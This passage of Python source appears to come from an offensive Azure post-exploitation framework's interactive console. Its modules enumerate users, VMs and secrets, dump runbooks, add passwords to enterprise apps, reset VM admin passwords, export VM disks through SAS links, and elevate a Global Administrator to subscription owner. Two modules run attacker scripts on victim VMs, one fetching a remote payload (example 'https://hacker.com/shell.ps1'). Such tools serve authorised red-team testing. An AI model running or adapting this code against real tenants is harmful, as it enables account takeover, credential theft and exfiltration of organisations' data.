                        if canPermissionBeAbused(permission) is not False:
                            allPermRolesAssignsRecords.add_row([allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "Yes", canPermissionBeAbused(permission).split("|")[1]])
                        else:
                            allPermRolesAssignsRecords.add_row([allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "No", "N/A"])
                print(allPermRolesAssignsRecords)
            elif "get_resources" in mode or "get_res" in mode:
                if TargetSubscription == None:
                    print("Please set target subscription.")
                else:
                    print("Listing resources under SubscriptionId = " + str(TargetSubscription) + "...")
                    resultResources = GetAllResourcesUnderSubscription(str(TargetSubscription), Token)
                    resultsInternalRes = resultResources['value']
                    subResRecords = PrettyTable()
                    subResRecords.align = "l"
                    subResRecordCount = 0
                    subResRecords.field_names = ["#", "Resource Name", "Type", "Location"]
                    for objRes in range(0, len(resultsInternalRes)):
                        resultResources = resultsInternalRes
                        subResRecordCount += 1
                        subResRecords.add_row(
                            [subResRecordCount, resultResources[objRes]['name'], resultResources[objRes]['type'],
                             resultResources[objRes]['location']])
                    print(subResRecords)
            elif mode == "show exploits":
                subExploitRecords = PrettyTable()
                subExploitRecords.align = "l"
                subExploitRecords.field_names = ["Name", "Disclosure Date", "Rate", "Description"]
                subExploitRecords.add_row(["GlobalAdministrator/elevateAccess", "04.07.2022", "Good", "Exploits the Global Administrator role to modify privileges to Azure Resources"])
                print(subExploitRecords)
            elif "use" in mode:
                argExpSub = mode.replace("use ", "").replace(" ", "")
                if argExpSub == "use":
                    print("please choose an exploit")
                else:
                    checkExploitInital = mode.split("use ")
                    if checkExploitInital[1] not in exploits:
                        print("Not supported exploit. Supported exploits: " + str(exploits))
                    else:
                        if hasTokenInPlace():
                            ExploitChoosen = argExpSub
                        else:
                            if "Token/" in checkExploitInital[1]:
                                ExploitChoosen = argExpSub
                            else:
                                print("Please set target victim access token. Use Token/* exploits.")
            elif mode == "back" or mode == "exit":
                if ExploitChoosen is not None:
                    ExploitChoosen = None
                else:
                    exit
            elif mode == "showtoken":
                print(getToken())
            elif mode == "deltoken":
                print("Resetting token..")
                setToken("")
            elif "Token/GenToken" in ExploitChoosen and mode == "run":
                print("Trying getting token automatically for you...")
                initToken(tryGetToken(), False)
            elif "Token/SetToken" in ExploitChoosen and mode == "run":
                print("Please paste your Azure token here:")
                token = input("Enter Token:")
                initToken(token, True)
                print("All set.")
            elif "Reader/ExposedAppServiceApps" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all external-facing Azure Service Apps..")
                AppServiceRecords = PrettyTable()
                AppServiceRecords.align = "l"
                AppServiceRecords.field_names = ["#", "App Name", "Type", "Status", "Enabled Hostname(s)"]
                AppServiceRecordsCount = 0
                for AppServiceRecord in RD_ListExposedWebApps()['value']:
                    AppServiceRecords.add_row([AppServiceRecordsCount, AppServiceRecord['name'], AppServiceRecord['kind'], AppServiceRecord['properties']['state'], ",".join(AppServiceRecord['properties']['enabledHostNames'])])
                    AppServiceRecordsCount += 1
                print(AppServiceRecords)
            elif "Reader/ListAllAzureContainerRegistry" in ExploitChoosen and mode == "run":
                print("Trying to list all ACR (Azure Container Registry) available in all subscriptions..")
                ACRRecords = PrettyTable()
                ACRRecords.align = "l"
                ACRRecords.field_names = ["#", "Registry Name", "Location", "Login Server", "AdminEnabled", "CreatedAt"]
                ACRRecordsCount = 0
                for ACRRecord in RD_ListAllACRs()['value']:
                    ACRRecords.add_row([ACRRecordsCount, ACRRecord['name'], ACRRecord['location'], ACRRecord['properties']['loginServer'], ACRRecord['properties']['adminUserEnabled'], ACRRecord['properties']['loginServer']])
                    ACRRecordsCount += 1
                print(ACRRecords)
            elif "Reader/ListAutomationAccounts" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all automation accounts..")
                AutomationAccountRecords = PrettyTable()
                AutomationAccountRecords.align = "l"
                AutomationAccountRecords.field_names = ["#", "SubscriptionId", "AccountName", "Location", "Tags"]
                AutomationAccountRecordsCount = 0
                for AutomationAccRecord in RD_ListAutomationAccounts():
                    AutomationAccountRecords.add_row(
                        [AutomationAccountRecordsCount, AutomationAccRecord['subscriptionId'], AutomationAccRecord['name'], AutomationAccRecord['location'],
                         str(AutomationAccRecord['tags'])])
                    AutomationAccountRecordsCount += 1
                print(AutomationAccountRecords)
            elif "Reader/DumpAllRunBooks" in ExploitChoosen and mode == "run":
                print("Trying to dump runbooks codes under available automation accounts (it may takes a few minutes)..")
                print("Keep in mind that it might be noisy opsec..")
                ExportedRunBooksRecordsCount = 0
                DestPath = input("Please enter the path for store the data locally [i.e. C:\\tmp]: ")
                for CurrentRunBookRecord in RD_ListRunBooksByAutomationAccounts():
                    with open(os.path.normpath(DestPath+'\\'+'runbook_'+str(CurrentRunBookRecord['name'])+'.txt'), 'x') as f:
                        f.write(str(RD_DumpRunBookContent(CurrentRunBookRecord['id'])))
                    ExportedRunBooksRecordsCount += 1
                print("Done. Dumped Total " + str(ExportedRunBooksRecordsCount) + " runbooks to " + str(DestPath))
            elif "Reader/ListAllRunBooks" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all runbooks under available automation accounts..")
                RunBooksRecords = PrettyTable()
                RunBooksRecords.align = "l"
                RunBooksRecords.field_names = ["#", "SubscriptionId", "AutomationAccount", "Runbook Name", "Runbook Type", "Status", "CreatedAt", "UpdatedAt"]
                RunBooksRecordsCount = 0
                for RunBookRecord in RD_ListRunBooksByAutomationAccounts():
                    RunBooksRecords.add_row([RunBooksRecordsCount, RunBookRecord['subscriptionId'], RunBookRecord['automationAccount'], RunBookRecord['name'], RunBookRecord['properties']['runbookType'], RunBookRecord['properties']['state'], RunBookRecord['properties']['creationTime'], RunBookRecord['properties']['lastModifiedTime']])
                    RunBooksRecordsCount += 1
                print(RunBooksRecords)
            elif "Reader/ARMTemplatesDisclosure" in ExploitChoosen and mode == "run":
                print("Trying to enumerate outputs and parameters strings from a Azure Resource Manager (ARM)..")
                ArmTempRecords = PrettyTable()
                ArmTempRecords.align = "l"
                ArmTempRecords.field_names = ["#", "Deployment Name", "Parameter Name", "Parameter Value", "Type"]
                ArmTempRecordsCount = 0
                print("Skipping SecureString/Object/Array values from list..")
                for ArmTempRecord in RD_ListARMTemplates():
                    for itStr in ArmTempRecord['params']:
                        if ArmTempRecord['params'][itStr]['type'] == "SecureString" or ArmTempRecord['params'][itStr]['type'] == "Array" or ArmTempRecord['params'][itStr]['type'] == "Object":
                            continue
                        ArmTempRecords.add_row(
                            [ArmTempRecordsCount, ArmTempRecord['name'], itStr, ArmTempRecord['params'][itStr]['type'],
                             ArmTempRecord['params'][itStr]['value']])
                    for itStrO in ArmTempRecord['outputs']:
                        ArmTempRecords.add_row([ArmTempRecordsCount, ArmTempRecord['name'], itStrO, ArmTempRecord['outputs'][itStrO]['type'],ArmTempRecord['outputs'][itStrO]['value']])
                    ArmTempRecordsCount += 1
                print(ArmTempRecords)
            elif "Reader/ListAllUsers" in ExploitChoosen and mode == "run":
                print("Trying to list all users.. (it might take a few minutes)")
                AllUsersRecords = PrettyTable()
                AllUsersRecords.align = "l"
                AllUsersRecords.field_names = ["#", "DisplayName", "First", "Last", "mobilePhone", "mail", "userPrincipalName"]
                AllUsersRecordsCount = 0
                for UserRecord in RD_ListAllUsers()['value']:
                    AllUsersRecords.add_row([AllUsersRecordsCount, UserRecord['displayName'], UserRecord['givenName'], UserRecord['surname'], UserRecord['mobilePhone'], UserRecord['mail'], UserRecord['userPrincipalName']])
                    AllUsersRecordsCount += 1
                print(AllUsersRecords)
            elif "Reader/ListVirtualMachines" in ExploitChoosen and mode == "run":
                print("Trying to list all virtual machines.. (it might take a few minutes)")
                AllVMRecords = PrettyTable()
                AllVMRecords.align = "l"
                AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP", "ResourceGroup", "Identity", "SubscriptionId"]
                AllVMRecordsCount = 0
                for UserVMRecord in RD_ListAllVMs():
                    if UserVMRecord['identity'] == "N/A":
                        VMIdentity = "N/A"
                    else:
                        VMIdentity = UserVMRecord['identity']['type']
                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], "N/A", UserVMRecord['resourceGroup'], VMIdentity, UserVMRecord['subscriptionId']])
                    else:
                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name']), UserVMRecord['resourceGroup'], VMIdentity, UserVMRecord['subscriptionId']])
                        AllVMRecordsCount += 1
                print(AllVMRecords)
            elif "Reader/ListServicePrincipal" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all service principles (App registrations)..")
                EntAppsRecords = PrettyTable()
                EntAppsRecords.align = "l"
                EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "Has Ownership?"]
                EntAppsRecordsCount = 0
                for EntAppsRecord in RD_AddAppSecret()['value']:
                    EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], CHK_AppRegOwner(EntAppsRecord['appId'])])
                    EntAppsRecordsCount += 1
                print(EntAppsRecords)
            elif "Reader/abuseServicePrincipals" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all Enterprise applications (service principals)..")
                EntAppsRecords = PrettyTable()
                EntAppsRecords.align = "l"
                EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "Can Abused?"]
                EntAppsRecordsCount = 0
                for EntAppsRecord in RD_AddAppSecret()['value']:
                    print("Trying to register service principle for " + EntAppsRecord['displayName'] + " app..")
                    pwdGen = RD_addPasswordForEntrepriseApp(EntAppsRecord['appId'])
                    if pwdGen == "N/A":
                        EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], "N/A"])
                    else:
                        EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'],
                                                EntAppsRecord['publisherDomain'],pwdGen])
                    EntAppsRecordsCount += 1
                print(EntAppsRecords)
            elif "Contributor/RunCommandVM" in ExploitChoosen and mode == "run":
                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                victims = {}
                AllVMRecords = PrettyTable()
                AllVMRecords.align = "l"
                AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP", "OSType", "ResourceGroup","SubscriptionId"]
                AllVMRecordsCount = 0
                for UserVMRecord in RD_ListAllVMs():
                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
                        continue
                    else:
                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],"os": UserVMRecord['properties']['storageProfile']['osDisk']['osType'], "location": UserVMRecord['location'],"subId": UserVMRecord['subscriptionId'],"rg": UserVMRecord['resourceGroup']}
                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'],HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'], UserVMRecord['name']),UserVMRecord['properties']['storageProfile']['osDisk']['osType'],
                                              UserVMRecord['resourceGroup'],
                                              UserVMRecord['subscriptionId']])
                        AllVMRecordsCount += 1
                print(AllVMRecords)
                TargetVM = input("Select Target VM Name [i.e. 1]: ")
                Selection = int(TargetVM)
                CmdVMPath = input("Enter Path for Script [i.e. C:\exploit\shell.ps1]: ")
                with open(os.path.normpath(CmdVMPath)) as f:
                    CmdFileContent = f.read()
                print(CON_VMRunCommand(victims[Selection]["subId"],victims[Selection]["rg"],victims[Selection]["os"],victims[Selection]["name"], CmdFileContent))
            elif "Contributor/VMDiskExport" in ExploitChoosen and mode == "run":
                print("Trying to list deallocated virtual machines.. (it might take a few minutes)")
                victims = {}
                AllVMRecords = PrettyTable()
                AllVMRecords.align = "l"
                AllVMRecords.field_names = ["#", "Name", "Location", "DiskName", "VM Status"]
                AllVMRecordsCount = 0
                for UserVMRecord in RD_ListAllVMs():
                        VMState = HLP_GetVMInstanceView(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name'])
                        if VMState != "PowerState/deallocated":
                            continue
                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'], "location": UserVMRecord['location'], "diskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],"subId": UserVMRecord['subscriptionId'],"rg": UserVMRecord['resourceGroup']}
                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], UserVMRecord['properties']['storageProfile']['osDisk']['name'], VMState])
                        AllVMRecordsCount += 1
                print(AllVMRecords)
                TargetVM = input("Select Target DiskVM [i.e. 1]: ")
                print("Create a SAS link for VHD download...")
                Selection = int(TargetVM)
                print(CON_GenerateVMDiskSAS(victims[Selection]["subId"], victims[Selection]["rg"], victims[Selection]["diskName"], victims[Selection]["location"]))

            elif "Contributor/VMExtensionExecution" in ExploitChoosen and mode == "run":
                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                victims = {}
                AllVMRecords = PrettyTable()
                AllVMRecords.align = "l"
                AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup",
                                            "SubscriptionId"]
                AllVMRecordsCount = 0
                for UserVMRecord in RD_ListAllVMs():
                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],
                                           UserVMRecord['name']) == "N/A":
                        continue
                    else:
                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
                                                      "username": UserVMRecord['properties']['osProfile'][
                                                          'adminUsername'], "location": UserVMRecord['location'],
                                                      "subId": UserVMRecord['subscriptionId'],
                                                      "rg": UserVMRecord['resourceGroup']}
                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'],
                                              HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
                                                                  UserVMRecord['resourceGroup'], UserVMRecord['name']),
                                              UserVMRecord['properties']['osProfile']['adminUsername'],
                                              UserVMRecord['resourceGroup'],
                                              UserVMRecord['subscriptionId']])
                        AllVMRecordsCount += 1
                print(AllVMRecords)
                TargetVM = input("Select Target VM Name [i.e. 1]: ")
                RemotePayload = input("Enter Remote Payload [i.e. https://hacker.com/shell.ps1]: ")
                Selection = int(TargetVM)
                print(CON_VMExtensionExecution(victims[Selection]["subId"], victims[Selection]["location"],
                                              victims[Selection]["rg"], victims[Selection]["name"], RemotePayload))

            elif "Contributor/VMExtensionResetPwd" in ExploitChoosen and mode == "run":
                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                victims = {}
                AllVMRecords = PrettyTable()
                AllVMRecords.align = "l"
                AllVMRecords.field_names = ["#", "Name", "Location", "PublicIP",  "adminUsername", "ResourceGroup", "SubscriptionId"]
                AllVMRecordsCount = 0
                for UserVMRecord in RD_ListAllVMs():
                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
                        continue
                    else:
                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'], "username": UserVMRecord['properties']['osProfile']['adminUsername'], "location": UserVMRecord['location'], "subId": UserVMRecord['subscriptionId'], "rg": UserVMRecord['resourceGroup']}
                        AllVMRecords.add_row([AllVMRecordsCount, UserVMRecord['name'], UserVMRecord['location'], HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']),
                                              UserVMRecord['properties']['osProfile']['adminUsername'], UserVMRecord['resourceGroup'],
                                              UserVMRecord['subscriptionId']])
                        AllVMRecordsCount += 1
                print(AllVMRecords)
                TargetVM = input("Select Target VM Name [i.e. 1]: ")
                Selection = int(TargetVM)
                print(CON_VMExtensionResetPwd(victims[Selection]["subId"],victims[Selection]["location"],victims[Selection]["rg"],victims[Selection]["name"], "RandomExtNas", victims[Selection]["username"]))

            elif "GlobalAdministrator/elevateAccess" in ExploitChoosen and mode == "run":
                print("Elevating access to the root management group..")
                print(GA_ElevateAccess())
                print("Listing Target Subscriptions..")
                listSubs = ListSubscriptionsForToken()
                if listSubs.get('value') == None:
                    print("Exploit Failed: Error occured. Result: " + str(listSubs['error']['message']))
                else:
                    subRecords = PrettyTable()
                    subRecords.align = "l"
                    subRecords.field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
                    subRecordCount = 0
                    for subRecord in listSubs['value']:
                        subRecords.add_row(
                            [subRecordCount, subRecord['subscriptionId'], subRecord['displayName'], subRecord['state'],
                             subRecord['subscriptionPolicies']['quotaId'],
                             subRecord['subscriptionPolicies']['spendingLimit']])
                        subRecordCount += 1
                    print(subRecords)
                    TargetSubscriptionVictim = input("Choose Subscription >> ")
                    print(GA_AssignSubscriptionOwnerRole(str(TargetSubscriptionVictim)))
            else:
                print("unkown command.")


attackWindow()

'''
def statupWindow(isFromMenu):
    if isFromMenu:
        print("You're out of attack mode.")
        isFromMenu = False
    while (True):
        attackWindow()

       
        opt = input(">> ")
        if opt == "1":
            print("Trying getting token automaticlly for you...")
            initToken(tryGetToken())
        elif opt == "2":
            print("Please paste your Azure token here:")
            token = input("Enter Token:")
            initToken(token)
            print("All set.")
        elif opt == "3":
            print("Display Current token:")
            print(getToken())
        elif opt == "4":
            print("Resetting token..")
            setToken("")
        elif opt == "5":
            print("Getting into attack mode.. use command help for navigate")
            attackWindow()
        elif opt == "6":
            AboutWindow()
        elif opt == "whoami":
            currentProfile()
        elif opt == "scopes":
            currentScope()
        else:
            displayMenu(True)
'''